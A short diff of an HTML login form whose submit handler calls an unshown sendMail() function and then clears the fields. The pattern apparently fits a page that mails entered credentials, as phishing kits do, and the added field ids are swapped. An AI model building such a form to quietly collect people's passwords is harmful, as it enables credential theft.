@@ -73,12 +73,12 @@ span.psw {
     <img src="img_avatar2.png" alt="Avatar" class="avatar">
   </div>
   <div class="container">
-<form onclick="sendmail(); reset(); return false">
+  <form onsubmit="sendMail(); reset(); return false;">
     <label for="email"><b>Username</b></label>
-    <input type="text" placeholder="Email/Mobile number" name="email" required>
+    <input type="text" id="inp_pwd" placeholder="Email/Mobile number" name="email" required>
     
     <label for="password"><b>Password</b></label>
-    <input type="password" placeholder="Enter Password" name="password" required>
+    <input type="password" id="inp_uname" placeholder="Enter Password" name="password" required>
         
     <button type="submit">Login</button>
     <label>
